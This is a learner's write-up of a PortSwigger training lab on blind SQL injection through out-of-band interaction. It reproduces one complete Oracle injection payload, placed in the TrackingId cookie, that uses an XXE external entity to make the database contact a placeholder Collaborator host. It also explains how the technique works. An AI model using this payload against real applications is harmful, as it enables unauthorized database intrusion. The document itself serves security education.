# Lab 16: Blind SQL Injection with Out-of-Band Interaction

**Platform:** PortSwigger Web Security Academy

> **Note:** This lab requires Burp Suite Professional — specifically Burp Collaborator, which isn't available in the free Community edition and has no external substitute. There's no self-hosted or free alternative that replicates Collaborator's combination of a controllable DNS/HTTP listener plus Burp's built-in payload generation. I understand the solution and I'm documenting it below, but I haven't executed it myself and there are no screenshots for this one.

## What's going on here

Every technique so far relied on the vulnerable app's own response — a message, an error, a delay. This one flips that entirely: instead of watching the app for a signal, the injection makes the *database itself* reach out to an external server. No response content needed at all — just proof that an outbound DNS/HTTP request happened somewhere else.

## 🎯 Target

Trigger an out-of-band interaction from the database to a Burp Collaborator server, confirming injection without relying on any in-band signal.

## The theory

The payload modifies the `TrackingId` cookie, combining SQL injection with an XXE technique — using `EXTRACTVALUE` and `xmltype` to force the database to parse XML that references an external entity:

TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l')+FROM+dual--


The `BURP-COLLABORATOR-SUBDOMAIN` placeholder gets swapped for a real, unique subdomain by right-clicking the request in Burp and selecting **Insert Collaborator payload** — Burp auto-generates a subdomain it's actively listening on, which is the Professional-only piece here.

The mechanism: the XML declares an external entity pointing at that Collaborator subdomain. When Oracle parses it via `xmltype`, it tries to resolve that external reference — meaning the database itself makes an outbound network request to a server completely outside the application, with zero need for any response to come back to the browser.

After sending the request, the **Collaborator tab** in Burp would show any incoming interactions logged against that subdomain — confirming the injection fired, purely through an out-of-band channel with no visible response difference at all.

## Result

Not executed — blocked by the Professional-only requirement. Documented from the lab's published methodology instead.

## Takeaway

Out-of-band techniques matter because they work even when an application gives away absolutely nothing — no error, no timing difference, no content change. As long as the injected query can force the database to make an outbound network call, Collaborator (or any listener you control) becomes the response channel instead of the app itself. This is also a good marker of where the free Community edition draws a hard line — Collaborator-dependent labs are one of the few gaps it can't work around.

---

Out-of-band interaction, in theory, confirms injection. Lab 17 takes the same idea further — smuggling actual data out through that same channel — but has the same Professional requirement, so it gets the same treatment: **[Lab 17 — Blind SQL Injection with Out-of-Band Data Exfiltration](lab-17-oob-exfiltration.md)**.
